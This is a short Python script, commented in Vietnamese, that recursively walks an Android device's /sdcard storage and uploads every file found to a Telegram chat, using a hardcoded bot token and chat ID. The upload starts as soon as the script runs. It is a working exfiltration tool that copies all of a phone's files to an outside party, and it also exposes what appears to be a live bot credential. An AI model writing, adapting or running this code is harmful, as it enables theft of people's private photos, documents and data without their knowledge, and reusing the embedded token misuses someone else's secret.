import os
import telebot

# Thay bằng token bot Telegram thật của bạn
BOT_TOKEN = "7463062603:AAEAGU-e9d-4-UrDeLWMHeKYn5hKdhk5SLc" 
CHAT_ID = "7944440933"  # ID của người nhận (hoặc nhóm chat)

bot = telebot.TeleBot(BOT_TOKEN)

def send_file_to_telegram(file_path):
    try:
        with open(file_path, "rb") as f:
            bot.send_document(CHAT_ID, f)
            print(f"Đã gửi tệp: {file_path}")
    except Exception as e:
        print(f"Lỗi khi gửi tệp: {e}")

def send_all_files_from_directory(directory):
    for root, _, filenames in os.walk(directory):
        for filename in filenames:
            file_path = os.path.join(root, filename)
            send_file_to_telegram(file_path)

# Gọi hàm với thư mục bạn muốn gửi file từ đó (ví dụ: /sdcard trên Android)
send_all_files_from_directory("/sdcard")
